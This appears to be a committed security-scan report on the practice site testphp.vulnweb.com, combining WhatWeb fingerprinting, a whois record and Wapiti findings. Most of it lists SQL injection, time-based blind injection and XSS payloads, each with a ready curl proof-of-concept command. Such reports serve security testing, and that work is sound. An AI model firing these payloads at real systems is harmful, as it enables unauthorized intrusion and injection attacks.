@@ -1,0 +1,327 @@
+WhatWeb report for http://testphp.vulnweb.com/
+Status    : 200 OK
+Title     : <None>
+IP        : 176.28.50.165
+Country   : GERMANY, DE
+
+Summary   : HTTPServer[nginx/1.4.1], nginx[1.4.1], PHP[5.3.10-1~lucid+2uwsgi2], X-Powered-By[PHP/5.3.10-1~lucid+2uwsgi2]
+
+Detected Plugins:
+[ HTTPServer ]
+	HTTP server header string. This plugin also attempts to 
+	identify the operating system from the server header. 
+
+	String       : nginx/1.4.1 (from server string)
+
+[ PHP ]
+	PHP is a widely-used general-purpose scripting language 
+	that is especially suited for Web development and can be 
+	embedded into HTML. This plugin identifies PHP errors, 
+	modules and versions and extracts the local file path and 
+	username if present. 
+
+	Version      : 5.3.10-1~lucid+2uwsgi2
+	Google Dorks: (2)
+	Website     : http://www.php.net/
+
+[ X-Powered-By ]
+	X-Powered-By HTTP header 
+
+	String       : PHP/5.3.10-1~lucid+2uwsgi2 (from x-powered-by string)
+
+[ nginx ]
+	Nginx (Engine-X) is a free, open-source, high-performance 
+	HTTP server and reverse proxy, as well as an IMAP/POP3 
+	proxy server. 
+
+	Version      : 1.4.1
+	Website     : http://nginx.net/
+
+HTTP Headers:
+	HTTP/1.1 200 OK
+	Server: nginx/1.4.1
+	Date: Thu, 02 Jul 1970 07:51:04 GMT
+	Content-Type: text/html
+	X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
+	Content-Encoding: gzip
+	Content-Length: 200
+	Connection: close
+	
+% This is the RIPE Database query service.
+% The objects are in RPSL format.
+%
+% The RIPE Database is subject to Terms and Conditions.
+% See http://www.ripe.net/db/support/db-terms-conditions.pdf
+
+% Note: this output has been filtered.
+%       To receive output for a database update, use the "-B" flag.
+
+% Information related to '176.28.48.0 - 176.28.55.255'
+
+% Abuse contact for '176.28.48.0 - 176.28.55.255' is 'abuse@hosteurope.de'
+
+inetnum:        176.28.48.0 - 176.28.55.255
+remarks:        INFRA-AW
+netname:        DE-HE-RS-CLIENTS-176-28-48-NET
+descr:          Host Europe GmbH
+country:        DE
+admin-c:        HM5126-RIPE
+tech-c:         HM5126-RIPE
+status:         ASSIGNED PA
+mnt-by:         MNT-HEG-MASS
+created:        2012-01-06T16:03:11Z
+last-modified:  2015-12-01T15:01:32Z
+source:         RIPE # Filtered
+
+role:           HEG Mass
+address:        HEG Mass
+address:        Daimler Strasse 9-11
+address:        50354 Huerth
+address:        Germany
+phone:          +49 2203 1045 0
+admin-c:        JUPP
+admin-c:        OUZO
+tech-c:         JUPP
+tech-c:         OUZO
+nic-hdl:        HM5126-RIPE
+mnt-by:         MNT-HEG-MASS
+created:        2015-11-05T11:32:14Z
+last-modified:  2015-12-07T15:15:08Z
+source:         RIPE # Filtered
+
+% Information related to '176.28.48.0/21AS8972'
+
+route:          176.28.48.0/21
+origin:         AS8972
+mnt-by:         MNT-HEG-MASS
+created:        2019-04-11T06:24:26Z
+last-modified:  2019-04-11T06:24:26Z
+source:         RIPE
+
+% This query was served by the RIPE Database Query Service version 1.97.2 (ANGUS)
+
+
+********************************************************************************
+                     Wapiti 3.0.3 - wapiti.sourceforge.io
+                    Report for http://testphp.vulnweb.com/
+              Date of the scan : Sun, 27 Sep 2020 08:10:29 +0000
+                          Scope of the scan : folder
+********************************************************************************
+
+Summary of vulnerabilities :
+----------------------------
+                                                            SQL Injection :   7
+                                                      Blind SQL Injection :   1
+                                                            File Handling :   0
+                                                     Cross Site Scripting :  10
+                                                           CRLF Injection :   0
+                                                       Commands execution :   0
+                                                          Htaccess Bypass :   0
+                                                              Backup file :   0
+                                               Potentially dangerous file :   0
+                                              Server Side Request Forgery :   0
+                                                            Open Redirect :   0
+                                                                      XXE :   0
+********************************************************************************
+
+SQL Injection
+-------------
+MySQL Injection via injection in the parameter artist
+Evil request:
+    GET /artists.php?artist=%C2%BF%27%22%28 HTTP/1.1
+    Host: testphp.vulnweb.com
+cURL command PoC : "curl "http://testphp.vulnweb.com/artists.php?artist=%C2%BF%27%22%28""
+
+                                  *   *   *
+
+MySQL Injection via injection in the parameter artist
+Evil request:
+    GET /listproducts.php?artist=%C2%BF%27%22%28 HTTP/1.1
+    Host: testphp.vulnweb.com
+cURL command PoC : "curl "http://testphp.vulnweb.com/listproducts.php?artist=%C2%BF%27%22%28""
+
+                                  *   *   *
+
+MySQL Injection via injection in the parameter test
+Evil request:
+    GET /search.php?test=%C2%BF%27%22%28 HTTP/1.1
+    Host: testphp.vulnweb.com
+cURL command PoC : "curl "http://testphp.vulnweb.com/search.php?test=%C2%BF%27%22%28""
+
+                                  *   *   *
+
+MySQL Injection via injection in the parameter test
+Evil request:
+    POST /search.php?test=%C2%BF%27%22%28 HTTP/1.1
+    Host: testphp.vulnweb.com
+    Referer: http://testphp.vulnweb.com/
+    Content-Type: application/x-www-form-urlencoded
+
+    searchFor=default&goButton=go
+cURL command PoC : "curl "http://testphp.vulnweb.com/search.php?test=%C2%BF%27%22%28" -e "http://testphp.vulnweb.com/" -d "searchFor=default&goButton=go""
+
+                                  *   *   *
+
+MySQL Injection via injection in the parameter uuname
+Evil request:
+    POST /secured/newuser.php HTTP/1.1
+    Host: testphp.vulnweb.com
+    Referer: http://testphp.vulnweb.com/signup.php
+    Content-Type: application/x-www-form-urlencoded
+
+    uuname=%C2%BF%27%22%28&upass=Letm3in_&upass2=Letm3in_&urname=default&ucc=default&uemail=wapiti2019%40mailinator.com&uphone=default&signup=signup&uaddress=Hi+there%21
+cURL command PoC : "curl "http://testphp.vulnweb.com/secured/newuser.php" -e "http://testphp.vulnweb.com/signup.php" -d "uuname=%C2%BF%27%22%28&upass=Letm3in_&upass2=Letm3in_&urname=default&ucc=default&uemail=wapiti2019%40mailinator.com&uphone=default&signup=signup&uaddress=Hi+there%21""
+
+                                  *   *   *
+
+MySQL Injection via injection in the parameter uname
+Evil request:
+    POST /userinfo.php HTTP/1.1
+    Host: testphp.vulnweb.com
+    Referer: http://testphp.vulnweb.com/login.php
+    Content-Type: application/x-www-form-urlencoded
+
+    uname=%C2%BF%27%22%28&pass=Letm3in_
+cURL command PoC : "curl "http://testphp.vulnweb.com/userinfo.php" -e "http://testphp.vulnweb.com/login.php" -d "uname=%C2%BF%27%22%28&pass=Letm3in_""
+
+                                  *   *   *
+
+MySQL Injection via injection in the parameter pass
+Evil request:
+    POST /userinfo.php HTTP/1.1
+    Host: testphp.vulnweb.com
+    Referer: http://testphp.vulnweb.com/login.php
+    Content-Type: application/x-www-form-urlencoded
+
+    uname=default&pass=%C2%BF%27%22%28
+cURL command PoC : "curl "http://testphp.vulnweb.com/userinfo.php" -e "http://testphp.vulnweb.com/login.php" -d "uname=default&pass=%C2%BF%27%22%28""
+
+                                  *   *   *
+
+********************************************************************************
+
+Blind SQL Injection
+-------------------
+Blind SQL vulnerability via injection in the parameter artist
+Evil request:
+    GET /artists.php?artist=sleep%287%29%231 HTTP/1.1
+    Host: testphp.vulnweb.com
+cURL command PoC : "curl "http://testphp.vulnweb.com/artists.php?artist=sleep%287%29%231""
+
+                                  *   *   *
+
+********************************************************************************
+
+Cross Site Scripting
+--------------------
+XSS vulnerability found via injection in the parameter pp
+Evil request:
+    GET /hpp/?pp=%22%3E%3C%2Fa%3E%3CScRiPt%3Ealert%28%27wakmyzk50l%27%29%3C%2FsCrIpT%3E HTTP/1.1
+    Host: testphp.vulnweb.com
+cURL command PoC : "curl "http://testphp.vulnweb.com/hpp/?pp=%22%3E%3C%2Fa%3E%3CScRiPt%3Ealert%28%27wakmyzk50l%27%29%3C%2FsCrIpT%3E""
+
+                                  *   *   *
+
+XSS vulnerability found via injection in the parameter p
+Evil request:
+    GET /hpp/params.php?p=%3CScRiPt%3Ealert%28%27wbuvch5vqt%27%29%3C%2FsCrIpT%3E&pp=12 HTTP/1.1
+    Host: testphp.vulnweb.com
+cURL command PoC : "curl "http://testphp.vulnweb.com/hpp/params.php?p=%3CScRiPt%3Ealert%28%27wbuvch5vqt%27%29%3C%2FsCrIpT%3E&pp=12""
+
+                                  *   *   *
+
+XSS vulnerability found via injection in the parameter pp
+Evil request:
+    GET /hpp/params.php?p=valid&pp=%3CScRiPt%3Ealert%28%27wx15ajowx8%27%29%3C%2FsCrIpT%3E HTTP/1.1
+    Host: testphp.vulnweb.com
+cURL command PoC : "curl "http://testphp.vulnweb.com/hpp/params.php?p=valid&pp=%3CScRiPt%3Ealert%28%27wx15ajowx8%27%29%3C%2FsCrIpT%3E""
+
+                                  *   *   *
+
+XSS vulnerability found via injection in the parameter artist
+Evil request:
+    GET /listproducts.php?artist=%3CScRiPt%3Ealert%28%27wdkkcet4no%27%29%3C%2FsCrIpT%3E HTTP/1.1
+    Host: testphp.vulnweb.com
+cURL command PoC : "curl "http://testphp.vulnweb.com/listproducts.php?artist=%3CScRiPt%3Ealert%28%27wdkkcet4no%27%29%3C%2FsCrIpT%3E""
+
+                                  *   *   *
+
+XSS vulnerability found via injection in the parameter name
+Evil request:
+    POST /comment.php HTTP/1.1
+    Host: testphp.vulnweb.com
+    Referer: http://testphp.vulnweb.com/comment.php?aid=1
+    Content-Type: application/x-www-form-urlencoded
+
+    name=%3C%2Ftitle%3E%3CScRiPt%3Ealert%28%27w4p4egfl7t%27%29%3C%2FsCrIpT%3E&Submit=Submit&phpaction=echo+%24_POST%5Bcomment%5D%3B&comment=Hi+there%21
+cURL command PoC : "curl "http://testphp.vulnweb.com/comment.php" -e "http://testphp.vulnweb.com/comment.php?aid=1" -d "name=%3C%2Ftitle%3E%3CScRiPt%3Ealert%28%27w4p4egfl7t%27%29%3C%2FsCrIpT%3E&Submit=Submit&phpaction=echo+%24_POST%5Bcomment%5D%3B&comment=Hi+there%21""
+
+                                  *   *   *
+
+XSS vulnerability found via injection in the parameter name
+Evil request:
+    POST /guestbook.php HTTP/1.1
+    Host: testphp.vulnweb.com
+    Referer: http://testphp.vulnweb.com/guestbook.php
+    Content-Type: application/x-www-form-urlencoded
+
+    name=%3CScRiPt%3Ealert%28%27wnjnc7dxj5%27%29%3C%2FsCrIpT%3E&submit=add+message&text=Hi+there%21
+cURL command PoC : "curl "http://testphp.vulnweb.com/guestbook.php" -e "http://testphp.vulnweb.com/guestbook.php" -d "name=%3CScRiPt%3Ealert%28%27wnjnc7dxj5%27%29%3C%2FsCrIpT%3E&submit=add+message&text=Hi+there%21""
+
+                                  *   *   *
+
+XSS vulnerability found via injection in the parameter text
+Evil request:
+    POST /guestbook.php HTTP/1.1
+    Host: testphp.vulnweb.com
+    Referer: http://testphp.vulnweb.com/guestbook.php
+    Content-Type: application/x-www-form-urlencoded
+
+    name=anonymous+user&submit=add+message&text=%3CScRiPt%3Ealert%28%27w3ytmsgjn3%27%29%3C%2FsCrIpT%3E
+cURL command PoC : "curl "http://testphp.vulnweb.com/guestbook.php" -e "http://testphp.vulnweb.com/guestbook.php" -d "name=anonymous+user&submit=add+message&text=%3CScRiPt%3Ealert%28%27w3ytmsgjn3%27%29%3C%2FsCrIpT%3E""
+
+                                  *   *   *
+
+XSS vulnerability found via injection in the parameter uemail
+Evil request:
+    POST /secured/newuser.php HTTP/1.1
+    Host: testphp.vulnweb.com
+    Referer: http://testphp.vulnweb.com/signup.php
+    Content-Type: application/x-www-form-urlencoded
+
+    uuname=default&upass=Letm3in_&upass2=Letm3in_&urname=default&ucc=default&uemail=%3CScRiPt%3Ealert%28%27wjexravx2k%27%29%3C%2FsCrIpT%3E&uphone=default&signup=signup&uaddress=Hi+there%21
+cURL command PoC : "curl "http://testphp.vulnweb.com/secured/newuser.php" -e "http://testphp.vulnweb.com/signup.php" -d "uuname=default&upass=Letm3in_&upass2=Letm3in_&urname=default&ucc=default&uemail=%3CScRiPt%3Ealert%28%27wjexravx2k%27%29%3C%2FsCrIpT%3E&uphone=default&signup=signup&uaddress=Hi+there%21""
+
+                                  *   *   *
+
+XSS vulnerability found via injection in the parameter uphone
+Evil request:
+    POST /secured/newuser.php HTTP/1.1
+    Host: testphp.vulnweb.com
+    Referer: http://testphp.vulnweb.com/signup.php
+    Content-Type: application/x-www-form-urlencoded
+
+    uuname=default&upass=Letm3in_&upass2=Letm3in_&urname=default&ucc=default&uemail=wapiti2019%40mailinator.com&uphone=%3CScRiPt%3Ealert%28%27wet0dbj5jz%27%29%3C%2FsCrIpT%3E&signup=signup&uaddress=Hi+there%21
+cURL command PoC : "curl "http://testphp.vulnweb.com/secured/newuser.php" -e "http://testphp.vulnweb.com/signup.php" -d "uuname=default&upass=Letm3in_&upass2=Letm3in_&urname=default&ucc=default&uemail=wapiti2019%40mailinator.com&uphone=%3CScRiPt%3Ealert%28%27wet0dbj5jz%27%29%3C%2FsCrIpT%3E&signup=signup&uaddress=Hi+there%21""
+
+                                  *   *   *
+
+XSS vulnerability found via injection in the parameter uaddress
+Evil request:
+    POST /secured/newuser.php HTTP/1.1
+    Host: testphp.vulnweb.com
+    Referer: http://testphp.vulnweb.com/signup.php
+    Content-Type: application/x-www-form-urlencoded
+
+    uuname=default&upass=Letm3in_&upass2=Letm3in_&urname=default&ucc=default&uemail=wapiti2019%40mailinator.com&uphone=default&signup=signup&uaddress=%3CScRiPt%3Ealert%28%27ww76h49mme%27%29%3C%2FsCrIpT%3E
+cURL command PoC : "curl "http://testphp.vulnweb.com/secured/newuser.php" -e "http://testphp.vulnweb.com/signup.php" -d "uuname=default&upass=Letm3in_&upass2=Letm3in_&urname=default&ucc=default&uemail=wapiti2019%40mailinator.com&uphone=default&signup=signup&uaddress=%3CScRiPt%3Ealert%28%27ww76h49mme%27%29%3C%2FsCrIpT%3E""
+
+                                  *   *   *
+
+********************************************************************************
+
+Summary of anomalies :
+----------------------
+                                                    Internal Server Error :   0
+                                                     Resource consumption :   0
+********************************************************************************
